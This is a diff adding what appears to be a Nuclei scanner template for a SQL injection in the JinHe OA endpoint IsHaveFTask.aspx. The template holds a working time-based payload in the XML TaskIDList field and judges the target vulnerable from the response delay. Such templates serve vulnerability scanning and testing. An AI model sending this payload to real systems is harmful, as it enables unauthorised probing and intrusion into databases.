@@ -1,0 +1,31 @@
+id: JinHeOA-IsHaveFTask-sqlInjection
+
+info:
+  name: JinHeOA-IsHaveFTask-sqlInjection
+  author: iSee857
+  severity: high
+  description: JinHeOA-IsHaveFTask-sqlInjection
+
+requests:
+  - method: POST
+    raw:
+      - |
+        POST /c6/Jhsoft.Web.dailytaskmanage/IsHaveFTask.aspx/ HTTP/1.1
+        Host: {{Host}}
+        Content-type:application/xml
+
+        <root>
+          <Task>
+            <TaskIDList>3);WAITFOR DELAY'0:0:5'-- </TaskIDList>
+          </Task>
+        </root>
+      
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+      - type: status
+        status:
+          - 200
